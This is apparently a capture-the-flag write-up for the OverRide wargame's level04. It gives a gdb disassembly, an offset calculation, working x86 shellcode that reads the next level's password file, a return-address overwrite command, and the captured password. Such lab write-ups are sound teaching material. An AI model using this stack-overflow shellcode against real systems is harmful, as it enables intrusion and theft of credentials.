# level04

```
level04@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level04
Dump of assembler code for function main:
   0x080486c8 <+0>:		push   ebp
   0x080486c9 <+1>:		mov    ebp,esp
   0x080486cb <+3>:		push   edi
   0x080486cc <+4>:		push   ebx
   0x080486cd <+5>:		and    esp,0xfffffff0
   0x080486d0 <+8>:		sub    esp,0xb0
[...]
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
```
To calculate the offset `0xb0 - 0x20 + 0x8(padding) + 0x4(ebp) = 0x9c(156)`.

```
level04@OverRide:~$ export SHELLCODE=`perl -e 'print "A"x100 . "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
level04@OverRide:~$ perl -e 'print "A"x156 . pack("V", 0xffffd845)' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
